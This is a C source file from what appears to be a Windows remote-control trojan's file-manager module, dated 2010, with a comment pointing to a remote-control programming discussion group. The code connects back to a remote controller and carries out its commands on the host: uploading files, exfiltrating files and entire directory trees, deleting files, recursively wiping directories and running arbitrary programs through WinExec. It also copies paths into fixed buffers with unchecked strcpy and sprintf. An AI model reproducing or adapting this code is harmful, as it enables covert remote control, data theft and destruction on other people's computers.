/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "up_down_file.h"

extern pshare_main g_share_main;

int up_down_file_socket_close(pio_socket i_socket)
{
    printf("%s\n","up_down_file_socket_close");
    P_SERVER_FILE p_server_file = i_socket->extend;
    P_CLIENT_FILE_LIST pclient_file_list = p_server_file->p_file_list;
    P_CLIENT_FILE_LIST pclient_file_temp;
    while(pclient_file_list){
        pclient_file_temp = pclient_file_list;
        pclient_file_list = pclient_file_list->next;
        free(pclient_file_temp);
    }
    free(i_socket->extend);
    free(i_socket->i_buffer);
    return 0;
}

int
km_main_connect(int ret, DWORD dwTrans, pio_socket i_socket, LPOVERLAPPED lpoverlapped)
{
    P_SERVER_FILE p_server_file = i_socket->extend;
    client_ver c_ver;
    if (ret) {
        i_socket->f_call_work = (void*)g_share_main->s_func.kms_func[6];
        i_socket->i_buffer      = (char*)malloc(809600);
        i_socket->i_length      = 809600;
        c_ver.wVersion = g_share_main->c_ver.wVersion;
        c_ver.wSystemVersion = g_share_main->c_ver.wSystemVersion;
        c_ver.c_type = C_UPDOWNFILE;
        k_sock_send(i_socket, 0, 0, p_server_file->crc32, (char*)&c_ver, sizeof(client_ver));
    } else {
        return SOCK_LOOP_CLOSE;
    }
    return SOCK_LOOP_RECV_HEADER;
}

int up_down_file(pio_socket i_socket, char *buffer, int length)
{
    pio_data_header pi_data_header = (pio_data_header)buffer;

    P_SERVER_FILE   p_server_file = (P_SERVER_FILE)malloc(sizeof(SERVER_FILE));
    memset(p_server_file,0x0,sizeof(SERVER_FILE));

    p_server_file->crc32 = pi_data_header->crc32;

    k_sock_connect(g_share_main->remote_addr, g_share_main->remote_port, km_main_connect, up_down_file_socket_close, p_server_file);
    return SOCK_LOOP_RECV_HEADER;
}

int up_file_name(pio_socket i_socket, char *buffer, int length)
{
//    printf("up_file_name\n");
    char path[1024]={0};

    pio_data_header pi_data_header = (pio_data_header)buffer;
    P_SERVER_FILE p_server_file = (P_SERVER_FILE)i_socket->extend;

    p_server_file->nMaxSize = pi_data_header->crc32;
    p_server_file->nCurSize = 0;

    if(p_server_file->c_file_type == F_UPDIRECTORY){
        sprintf(path,"%s%s",p_server_file->client_directory,buffer + sizeof(io_data_header));
    }else{
        strcpy(path,buffer + sizeof(io_data_header));
    }

    p_server_file->hFile = k_CreateFile(path,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
    if(p_server_file->hFile != INVALID_HANDLE_VALUE){
 //       printf("up_file_name:%s:length:%d\n",buffer + sizeof(io_data_header),(int)pi_data_header->crc32);
        k_sock_send(i_socket, 0x1, 0x4, p_server_file->nCurSize, NULL, 0);
    }

    return SOCK_LOOP_RECV_HEADER;
}

int up_file(pio_socket i_socket, char *bufferdd, int lengthdd)
{
 //   printf("up_file\n");
    DWORD dwSize = 0;
//    P_IO_DATA_HEADER p_io_data_header = (P_IO_DATA_HEADER)pio_data->buffer;
    P_SERVER_FILE p_server_file = (P_SERVER_FILE)i_socket->extend;
    int length = lengthdd - sizeof(io_data_header);

   // if(length > 0){
        k_WriteFile(p_server_file->hFile,bufferdd + sizeof(io_data_header),length,&dwSize,0);
        p_server_file->nCurSize += length;

        //printf("%d:%d\n",(int)p_server_file->nCurSize,(int)p_server_file->nMaxSize);

        if(p_server_file->nCurSize >= p_server_file->nMaxSize){
            //printf("up_file %d over\n",p_server_file->nCurSize);
            k_CloseHandle(p_server_file->hFile);

            //printf("up_file:%d:%d\n",(int)p_server_file->nFileCur,(int)p_server_file->nFileMax);
            p_server_file->nFileCur++;
            if(p_server_file->nFileCur >= p_server_file->nFileMax){
                //printf("k_sock_close\n");
                k_sock_close(i_socket);
            }
            if(p_server_file->c_file_type == F_UPDIRECTORY){
                k_sock_send(i_socket, 0x1, 0x7, p_server_file->nFileCur, NULL, 0);
            }
        }else{
            //printf("up_file %d\n",p_server_file->nCurSize);
            k_sock_send(i_socket, 0x1, 0x4, p_server_file->nCurSize, NULL, 0);
        }
    /*}
    else{
    }*/
    return SOCK_LOOP_RECV_HEADER;
}

int down_file_name(pio_socket i_socket, char *buffer, int length)
{
    //printf("down_file_name\n");
    //P_IO_DATA_HEADER p_io_data_header = (P_IO_DATA_HEADER)pio_data->buffer;
    P_SERVER_FILE p_server_file = (P_SERVER_FILE)i_socket->extend;

    p_server_file->hFile = k_CreateFile(buffer + sizeof(io_data_header),GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
    if(p_server_file->hFile != NULL){
        p_server_file->nMaxSize = k_GetFileSize(p_server_file->hFile,NULL);
        p_server_file->nCurSize = 0;

        //printf("down_file_name:%s:length:%d\n",pio_data->curbuffer,p_server_file->nMaxSize);
        k_sock_send(i_socket, 0x1, 0x5, p_server_file->nMaxSize, NULL, 0);
    }
    //printf("down_file_name over\n",pio_data->curbuffer,p_io_data_header->crc32);
    return SOCK_LOOP_RECV_HEADER;
}

int down_file(pio_socket i_socket, char *buffer, int length)
{
   // printf("down_file\n");
    DWORD dwSize = 0;
    pio_data_header    pi_data_header    = (pio_data_header)buffer;
    P_SERVER_FILE      p_server_file        = (P_SERVER_FILE)i_socket->extend;

    //printf("%s %d:%d\n","down_file",p_server_file->nCurSize,p_io_data_header->crc32);

    if(p_server_file->nCurSize == pi_data_header->crc32)
    if(k_ReadFile(p_server_file->hFile,i_socket->i_buffer,65536,&dwSize,NULL)){

        p_server_file->nCurSize += dwSize;
        k_sock_send(i_socket, 0x1, 0x6, 0, i_socket->i_buffer, dwSize);
    }

    if(p_server_file->nCurSize >= p_server_file->nMaxSize){
        k_CloseHandle(p_server_file->hFile);
        if(p_server_file->c_file_type != F_DOWNDIRECTORY){
            k_sock_close(i_socket);
        }
    }
    return SOCK_LOOP_RECV_HEADER;
}


int up_directory_name(pio_socket i_socket, char *buffer, int length)
{
    //printf("up_directory_name\n");
    pio_data_header pi_data_header    = (pio_data_header)buffer;;
    P_SERVER_FILE p_server_file = (P_SERVER_FILE)i_socket->extend;

    p_server_file->c_file_type = F_UPDIRECTORY;

    strcpy(p_server_file->client_directory,buffer+sizeof(io_data_header));
    p_server_file->nFileMax = pi_data_header->crc32;

    k_CreateDirectory(p_server_file->client_directory,NULL);

    k_sock_send(i_socket,0x1,0x7,0,NULL,0);

    //printf("up_directory_name:%d:%s\n",p_server_file->nFileMax,p_server_file->client_directory);
    return SOCK_LOOP_RECV_HEADER;
}

int up_directory(pio_socket i_socket, char *buffer, int length)
{
    //printf("up_directory\n");
    char path[1024]={0};

    P_SERVER_FILE p_server_file = (P_SERVER_FILE)i_socket->extend;
    sprintf(path,"%s%s",p_server_file->client_directory,buffer + sizeof(io_data_header));
    //printf("up_directory:%s\n",path);
    k_CreateDirectory(path,NULL);

    p_server_file->nFileCur++;

    k_sock_send(i_socket,0x1,0x7,p_server_file->nFileCur,NULL,0);
    return SOCK_LOOP_RECV_HEADER;
}

int down_directory(pio_socket i_socket, char *buffer, int length)
{
    //printf("down_directory\n");
 //   P_IO_DATA_HEADER p_io_data_header = (P_IO_DATA_HEADER)pio_data->buffer;
    P_SERVER_FILE p_server_file = (P_SERVER_FILE)i_socket->extend;
    p_server_file->c_file_type = F_DOWNDIRECTORY;
    strcpy(p_server_file->client_directory,buffer+sizeof(io_data_header));

    p_server_file->nFileMax = enum_directory(p_server_file,"\\",p_server_file->client_directory);

    /*P_CLIENT_FILE_LIST pclient_file_list = p_server_file->p_file_list;
    while(pclient_file_list){
        printf("%s\n",pclient_file_list->filename);
        pclient_file_list = pclient_file_list->next;
    }*/

    //printf("down_directory :%s:%d\n",p_server_file->client_directory,(int)p_server_file->nFileMax);

    k_sock_send(i_socket,0x1,0x8,p_server_file->nFileMax,NULL,0);
    return SOCK_LOOP_RECV_HEADER;
}

int down_directory_next(pio_socket i_socket, char *buffer, int length)
{
    //printf("down_directory_next\n");
    char path[1024]={0};
    pio_data_header pi_data_header = (pio_data_header)buffer;
    P_SERVER_FILE p_server_file = (P_SERVER_FILE)i_socket->extend;

    if (pi_data_header->crc32 == 0) {
        p_server_file->c_file_list = p_server_file->p_file_list;
    } else {
        p_server_file->c_file_list = p_server_file->c_file_list->next;
    }

    //printf("%s %d %x\n","down_directory_next",p_io_data_header->crc32,p_server_file->c_file_list);
    if (p_server_file->c_file_list != NULL) {
        if(p_server_file->c_file_list->attributes & FILE_ATTRIBUTE_DIRECTORY){
            memcpy(i_socket->i_buffer,p_server_file->c_file_list->filename,strlen(p_server_file->c_file_list->filename));
            k_sock_send(i_socket,0x1,0x9,0,i_socket->i_buffer,strlen(p_server_file->c_file_list->filename));
        } else {
            sprintf(path,"%s%s",p_server_file->client_directory,p_server_file->c_file_list->filename);
            p_server_file->hFile = CreateFile(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
            p_server_file->nMaxSize = GetFileSize(p_server_file->hFile,NULL);
            p_server_file->nCurSize = 0;
            if(p_server_file->hFile != NULL){
                memcpy(i_socket->i_buffer,p_server_file->c_file_list->filename,strlen(p_server_file->c_file_list->filename));
                k_sock_send(i_socket,0x1,0x5,p_server_file->nMaxSize,i_socket->i_buffer,strlen(p_server_file->c_file_list->filename));
            }
        }
    } else {
        //k_sock_close(i_socket);
        return SOCK_LOOP_CLOSE;
    }
    return SOCK_LOOP_RECV_HEADER;
}


int enum_directory(P_SERVER_FILE pserver_file,char *startpath,char *findpath)
{
    NTSTATUS status;
    HANDLE hFile;
    ULONG len;
    int filecount=0;
    wchar_t w_findpath[256]={0};
    char    c_findpath[256]={0};

    char find_directory[MAX_PATH]={0};
    char start_path[MAX_PATH]={0};
    char pOut[256]={0};
    UNICODE_STRING fname = {0x02,0x06,L"*"};
    UNICODE_STRING u_findpath;

    char *buffer = (char*)malloc(0x48000);

    sprintf(c_findpath,"\\??\\%s",findpath);

    k_MultiByteToWideChar(CP_ACP,0,c_findpath,strlen(c_findpath),w_findpath,256);

    u_findpath.Buffer = w_findpath;
    u_findpath.Length = wcslen(w_findpath)*2;
    u_findpath.MaximumLength = u_findpath.Length;

    IO_STATUS_BLOCK iosb;
    OBJECT_ATTRIBUTES oa = {sizeof oa,NULL,&u_findpath,0x40};

    status = ZwOpenFile(&hFile,0x00100001,&oa,&iosb,0x00000007,0x00004021);                     //查找文件
    if(status >= 0 ){
        len = 0x48000;
        status = ZwQueryDirectoryFile(hFile, NULL, 0,NULL, &iosb, buffer, len, 3,FALSE, &fname, FALSE);
        if(status >= 0){
            PFILE_BOTH_DIR_INFORMATION pFile = (PFILE_BOTH_DIR_INFORMATION)buffer;

            for(;;){
                if(pFile->FileName[0] != (wchar_t)'.'){
                    filecount++;

                    memset(pOut,0x0,256);
                    k_WideCharToMultiByte(CP_ACP,0,pFile->FileName,pFile->FileNameLength/2,pOut,256,NULL,NULL);

                    P_CLIENT_FILE_LIST pclient_file_list = (P_CLIENT_FILE_LIST)malloc(sizeof(CLIENT_FILE_LIST));
                    if(pclient_file_list != NULL){
                        memset(pclient_file_list,0x0,sizeof(CLIENT_FILE_LIST));
                        pclient_file_list->attributes = pFile->FileAttributes;
                        sprintf(pclient_file_list->filename,"%s%s",startpath,pOut);
                        //printf("%s\n",pclient_file_list->filename);

                        if(pserver_file->p_file_list == NULL)
                            pserver_file->p_file_list = pclient_file_list;
                        else
                            pserver_file->c_file_list->next = pclient_file_list;

                        pserver_file->c_file_list = pclient_file_list;
                    }

                    if(pFile->FileAttributes & FILE_ATTRIBUTE_DIRECTORY){
                        sprintf(find_directory,"%s%s\\",findpath,pOut);
                        sprintf(start_path,"%s%s\\",startpath,pOut);
                        filecount += enum_directory(pserver_file,start_path,find_directory);
                    }
                }
                if(pFile->NextEntryOffset == 0)
                    break;
                pFile = (PFILE_BOTH_DIR_INFORMATION)(((char*)pFile)+pFile->NextEntryOffset);
            }
        }
        ZwClose(hFile);
    }
    free(buffer);
    return filecount;
}


int delete_enum_directory(char *path)
{
    NTSTATUS status;
    HANDLE hFile;
    ULONG len;
    wchar_t w_findpath[256]={0};
    char    c_findpath[256]={0};
    char find_directory[MAX_PATH]={0};
    char pOut[256]={0};
    UNICODE_STRING fname = {0x02,0x06,L"*"};
    UNICODE_STRING u_findpath;

    char *buff = (char*)malloc(0x48000);

    sprintf(c_findpath,"\\??\\%s",path);

    k_MultiByteToWideChar(CP_ACP,0,c_findpath,strlen(c_findpath),w_findpath,256);

    u_findpath.Buffer = w_findpath;
    u_findpath.Length = wcslen(w_findpath)*2;
    u_findpath.MaximumLength = u_findpath.Length;

    IO_STATUS_BLOCK iosb;
    OBJECT_ATTRIBUTES oa = {sizeof oa,NULL,&u_findpath,0x40};

    status = ZwOpenFile(&hFile,0x00100001,&oa,&iosb,0x00000007,0x00004021);                     //查找文件
    if(status >= 0 ){
        len = 0x48000;
        status = ZwQueryDirectoryFile(hFile, NULL, 0,NULL, &iosb, buff, len, 3,FALSE, &fname, FALSE);
        if(status >= 0){
            PFILE_BOTH_DIR_INFORMATION pFile = (PFILE_BOTH_DIR_INFORMATION)buff;

            for(;;){
                if(pFile->FileName[0] != (wchar_t)'.'){
                    memset(pOut,0x0,256);
                    k_WideCharToMultiByte(CP_ACP,0,pFile->FileName,pFile->FileNameLength/2,pOut,256,NULL,NULL);
                    if(pFile->FileAttributes & FILE_ATTRIBUTE_DIRECTORY){
                        sprintf(find_directory,"%s%s\\",path,pOut);
                        delete_enum_directory(find_directory);
                        k_RemoveDirectory(find_directory);
                    }else{
                        sprintf(find_directory,"%s%s",path,pOut);
                        k_DeleteFile(find_directory);
                    }
                }
                if(pFile->NextEntryOffset == 0)
                    break;
                pFile = (PFILE_BOTH_DIR_INFORMATION)(((char*)pFile)+pFile->NextEntryOffset);
            }
        }
        ZwClose(hFile);
    }

    free(buff);
    k_RemoveDirectory(path);
    return 0;
}

int delete_file(pio_socket i_socket, char *buffer, int length)
{
    printf("delete_file:%s\n",buffer + sizeof(io_data_header));
    k_DeleteFile(buffer + sizeof(io_data_header));
    return SOCK_LOOP_RECV_HEADER;
}

int delete_directory(pio_socket i_socket, char *buffer, int length)
{
    printf("delete_directory:%s\n",buffer + sizeof(io_data_header));
    delete_enum_directory(buffer + sizeof(io_data_header));
    return SOCK_LOOP_RECV_HEADER;
}

int exec_file(pio_socket i_socket, char *buffer, int length)
{
    printf("exec_file:%s\n",buffer + sizeof(io_data_header));
    k_WinExec(buffer + sizeof(io_data_header),SW_SHOW);
    return SOCK_LOOP_RECV_HEADER;
}
